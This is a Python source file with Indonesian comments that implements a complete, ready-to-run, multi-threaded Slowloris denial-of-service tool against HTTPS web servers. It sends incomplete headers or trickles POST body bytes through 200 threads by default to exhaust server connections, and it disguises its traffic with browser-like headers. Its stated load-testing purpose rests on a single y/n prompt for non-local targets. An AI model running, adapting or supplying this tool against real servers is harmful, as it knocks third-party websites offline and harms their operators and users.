import socket
import ssl
import threading
import time
import argparse
import logging
import sys
import random # Untuk nilai acak di header dummy

# Konfigurasi Logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(threadName)s - %(message)s')

# --- Fungsi Utama Serangan Slowloris ---
def slowloris_attack(target_host: str, target_port: int, ssl_context: ssl.SSLContext, 
                     http_method: str, http_path: str, custom_headers: list):
    """
    Melakukan satu instans serangan Slowloris dengan header yang lebih realistis dan mendukung GET/POST.
    Membuka koneksi, mengirim header HTTP yang tidak lengkap, dan kemudian secara berkala
    mengirim header tambahan atau bagian body untuk menjaga koneksi tetap hidup.
    """
    sock = None
    ssl_sock = None
    try:
        # 1. Buat Socket TCP/IP
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(15) # Atur timeout untuk operasi socket, sedikit lebih lama

        logging.debug(f"[{threading.current_thread().name}] Mencoba menyambung ke {target_host}:{target_port}...")

        # 2. Bungkus Socket dengan SSL/TLS (untuk HTTPS)
        ssl_sock = ssl_context.wrap_socket(sock, server_hostname=target_host)
        ssl_sock.connect((target_host, target_port))

        logging.info(f"[{threading.current_thread().name}] Koneksi berhasil dibuat ke {target_host}:{target_port}.")

        # 3. Buat dan Kirim Header HTTP Awal (Tidak Lengkap)
        # Ini adalah bagian kunci dari Slowloris. Kita mengirimkan header awal
        # tetapi TIDAK mengirim baris kosong ganda (\r\n\r\n) yang akan menandakan
        # akhir dari header.

        # Header standar yang lebih lengkap dan umum dari browser
        base_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Keep-Alive": "900", # Minta server untuk menjaga koneksi tetap hidup lebih lama
            "Cache-Control": "no-cache",
            "Pragma": "no-cache"
        }

        # Gabungkan custom_headers (dari argumen baris perintah)
        # Custom headers bisa menimpa base headers jika ada konflik kunci
        final_headers = {**base_headers} # Salin base_headers
        for header_str in custom_headers:
            if ':' in header_str:
                key, value = header_str.split(':', 1)
                final_headers[key.strip()] = value.strip()
            else:
                logging.warning(f"[{threading.current_thread().name}] Header kustom tidak valid: '{header_str}'. Abaikan.")

        # Baris permintaan HTTP pertama (GET /path HTTP/1.1)
        request_line = f"{http_method.upper()} {http_path} HTTP/1.1\r\n"
        ssl_sock.sendall(request_line.encode('utf-8'))
        logging.debug(f"[{threading.current_thread().name}] Mengirim request line: '{request_line.strip()}'")
        time.sleep(0.05)

        # Header Host adalah wajib
        ssl_sock.sendall(f"Host: {target_host}\r\n".encode('utf-8'))
        logging.debug(f"[{threading.current_thread().name}] Mengirim Host header: 'Host: {target_host}'")
        time.sleep(0.05)

        # Jika metode POST, kita perlu menambahkan Content-Type dan Content-Length
        # Dalam Slowloris POST, kita bisa set Content-Length tinggi
        # tetapi hanya mengirim sebagian kecil dari body, atau tidak sama sekali.
        if http_method.upper() == "POST":
            # Ini adalah trik untuk Slowloris POST: buat server berharap banyak data
            # tetapi kirim hanya sedikit atau nol, lalu jaga koneksi hidup.
            content_length = random.randint(5000, 10000) # Ukuran body yang diharapkan (acak)
            final_headers["Content-Type"] = "application/x-www-form-urlencoded"
            final_headers["Content-Length"] = str(content_length)
            logging.info(f"[{threading.current_thread().name}] POST request, Content-Length disetel ke {content_length}.")

        # Kirim header lain dari final_headers
        for key, value in final_headers.items():
            # Hindari mengirim Host lagi karena sudah dikirim duluan
            if key.lower() == "host": 
                continue 
            header_line = f"{key}: {value}\r\n"
            ssl_sock.sendall(header_line.encode('utf-8'))
            logging.debug(f"[{threading.current_thread().name}] Mengirim header: '{header_line.strip()}'")
            time.sleep(0.05) # Sedikit jeda antar header

        logging.info(f"[{threading.current_thread().name}] Header awal (tidak lengkap) berhasil dikirim untuk {http_method.upper()} {http_path}.")

        # 4. Pertahankan Koneksi Terbuka dengan Mengirim Data Dummy Secara Berkala
        # Loop ini akan terus mengirim data untuk menjaga koneksi tetap hidup
        # dan mencegah server menganggap request selesai atau timeout.
        packet_count = 0
        while True:
            # Kirim header dummy (misalnya, X-a: <nomor_acak>) untuk GET
            # Atau kirim byte dummy untuk POST (bagian dari body yang diharapkan)
            if http_method.upper() == "GET":
                dummy_data = f"X-a: {random.randint(0, 99999)}\r\n"
            else: # POST
                # Untuk POST, kita bisa mengirim byte body secara perlahan
                # Atau header dummy jika kita ingin server terus menunggu header
                # tapi dalam kasus POST Slowloris, seringkali lebih efektif
                # untuk mengirim byte body secara perlahan.
                dummy_data = b"a" # Kirim 1 byte setiap kali
                # Jika kita ingin tetap mengirim header dummy:
                # dummy_data = f"X-a: {random.randint(0, 99999)}\r\n".encode('utf-8')

            ssl_sock.sendall(dummy_data.encode('utf-8') if isinstance(dummy_data, str) else dummy_data)
            logging.debug(f"[{threading.current_thread().name}] Mengirim data dummy: '{dummy_data.decode('utf-8').strip() if isinstance(dummy_data, bytes) else dummy_data.strip()}'")
            packet_count += 1
            time.sleep(10)  # Kirim data setiap 10 detik (bisa disesuaikan)

    except socket.timeout:
        logging.warning(f"[{threading.current_thread().name}] Koneksi ke {target_host}:{target_port} timeout.")
    except socket.error as e:
        logging.error(f"[{threading.current_thread().name}] Kesalahan koneksi atau soket: {str(e)}")
    except ssl.SSLError as e:
        logging.error(f"[{threading.current_thread().name}] Kesalahan SSL/TLS: {str(e)}")
    except Exception as e:
        logging.error(f"[{threading.current_thread().name}] Slowloris Error umum: {str(e)}", exc_info=True)
    finally:
        # Pastikan untuk menutup soket jika terbuka
        if ssl_sock:
            ssl_sock.close()
            logging.info(f"[{threading.current_thread().name}] Koneksi SSL ditutup untuk {target_host}.")
        elif sock:
            sock.close()
            logging.info(f"[{threading.current_thread().name}] Koneksi soket ditutup untuk {target_host}.")

# --- Fungsi untuk Memulai Serangan Multi-Thread ---
def start_slowloris_attack(target_host: str, target_port: int, num_threads: int, 
                           http_method: str, http_path: str, custom_headers: list):
    """
    Menginisialisasi dan memulai serangan Slowloris menggunakan beberapa thread.
    """
    logging.info(f"Memulai serangan Slowloris ke {target_host}:{target_port} dengan {num_threads} thread...")
    logging.info(f"Metode HTTP: {http_method.upper()}, Path: {http_path}")

    # Buat konteks SSL sekali dan bagikan antar thread (ini lebih efisien)
    context = ssl.create_default_context()
    context.check_hostname = False # JANGAN periksa nama host (risiko keamanan, tapi diperlukan di sini)
    context.verify_mode = ssl.CERT_NONE # JANGAN verifikasi sertifikat (risiko keamanan, tapi diperlukan di sini)
    
    threads = []
    for i in range(num_threads):
        thread_name = f"Slowloris-Thread-{i+1}"
        thread = threading.Thread(target=slowloris_attack, 
                                  args=(target_host, target_port, context, 
                                        http_method, http_path, custom_headers),
                                  name=thread_name)
        thread.daemon = True # Biarkan program utama keluar meskipun thread masih berjalan
        thread.start()
        threads.append(thread)
        logging.info(f"Thread '{thread_name}' dimulai.")
        time.sleep(0.01) # Sedikit jeda agar thread tidak mulai terlalu cepat bersamaan

    try:
        # Jaga program utama tetap berjalan agar thread-thread bisa bekerja
        while True:
            alive_threads = [t for t in threads if t.is_alive()]
            if not alive_threads:
                logging.info("Semua thread serangan telah berhenti.")
                break
            time.sleep(5) # Periksa status thread setiap 5 detik
            
    except KeyboardInterrupt:
        logging.info("Serangan dihentikan oleh pengguna (Ctrl+C).")
        # Daemon threads akan dihentikan secara otomatis saat program utama keluar.
    except Exception as e:
        logging.error(f"Kesalahan di main loop: {str(e)}", exc_info=True)

# --- Titik Masuk Program ---
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Skrip Serangan Slowloris untuk menguji ketahanan server web dengan header yang lebih realistis.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument(
        "host", 
        type=str, 
        help="Alamat IP atau nama host target (misal: localhost, 192.168.1.1, example.com)"
    )
    parser.add_argument(
        "-p", "--port", 
        type=int, 
        default=443, 
        help="Port target (default: 443 untuk HTTPS)"
    )
    parser.add_argument(
        "-t", "--threads", 
        type=int, 
        default=200, 
        help="Jumlah thread yang akan digunakan untuk serangan (default: 200)"
    )
    parser.add_argument(
        "-m", "--method",
        type=str,
        default="GET",
        choices=["GET", "POST"],
        help="Metode HTTP yang akan digunakan (default: GET)"
    )
    parser.add_argument(
        "-P", "--path",
        type=str,
        default="/",
        help="Path URL target (default: /)"
    )
    parser.add_argument(
        "-H", "--header",
        action="append",
        default=[],
        help="Tambahkan header HTTP kustom (misal: -H 'X-Custom: Value').\n"
             "Dapat digunakan beberapa kali."
    )
    parser.add_argument(
        "-v", "--verbose", 
        action="store_true", 
        help="Tampilkan output logging yang lebih detail (DEBUG level)"
    )

    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    logging.info("=== Slowloris Attack Initiated ===")
    logging.info(f"Target: {args.host}:{args.port}")
    logging.info(f"Threads: {args.threads}")
    logging.info(f"Method: {args.method.upper()}")
    logging.info(f"Path: {args.path}")
    if args.header:
        logging.info(f"Custom Headers: {args.header}")

    # Memastikan tidak ada penggunaan yang tidak disengaja terhadap sistem penting
    if args.host not in ["localhost", "127.0.0.1"] and not input(f"Anda akan menyerang '{args.host}'. Apakah Anda yakin (y/n)? ").lower() == 'y':
        logging.critical("Pengguna membatalkan serangan. Keluar.")
        sys.exit(1)

    start_slowloris_attack(args.host, args.port, args.threads, 
                           args.method, args.path, args.header)
    logging.info("Slowloris Attack selesai (atau dihentikan).")
